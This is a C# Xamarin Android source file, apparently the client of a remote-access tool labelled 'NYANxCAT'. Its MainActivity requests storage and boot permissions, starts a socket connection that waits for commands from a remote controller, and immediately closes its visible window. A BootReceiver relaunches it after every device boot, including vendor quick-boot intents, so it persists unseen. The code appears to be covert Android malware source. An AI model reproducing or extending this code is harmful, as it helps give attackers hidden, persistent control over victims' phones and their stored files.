using Android.App;
using Android.OS;
using Android.Support.V7.App;
using System.Threading;
using ClientAndroid.Project;
using Android;
using Android.Content;
using System;
using Android.Widget;

namespace ClientAndroid
{
    [Activity(Label = "NYANxCAT", Theme = "@style/AppTheme", MainLauncher = true)]
    public class MainActivity : AppCompatActivity
    {
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            Xamarin.Essentials.Platform.Init(this, savedInstanceState);
            // Set our view from the "main" layout resource
            SetContentView(Resource.Layout.activity_main);
            RequestPermissions(new string[] { Manifest.Permission.ReadExternalStorage, Manifest.Permission.WriteExternalStorage, Manifest.Permission.ReceiveBootCompleted }, 00);
            SocketClient.GetMainActivity = this;
            new Thread(new ThreadStart(delegate
            {
                if (SocketClient.IsConnected) return;
                SocketClient.ReceiveHeader();
            }))
            { IsBackground = false }.Start();
            this.FinishAffinity();
        }
    }


    [BroadcastReceiver(Enabled = true, Exported = true, DirectBootAware = true)]
    [IntentFilter(new string[] { Intent.ActionBootCompleted, Intent.ActionLockedBootCompleted, "android.intent.action.QUICKBOOT_POWERON", "com.htc.intent.action.QUICKBOOT_POWERON" })]
    public class BootReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            if (intent.Action.Equals(Intent.ActionBootCompleted))
            {
                var serviceIntent = new Intent(context, typeof(MainActivity));
                serviceIntent.AddFlags(ActivityFlags.NewTask);
                context.StartActivity(serviceIntent);
            }
        }
    }
}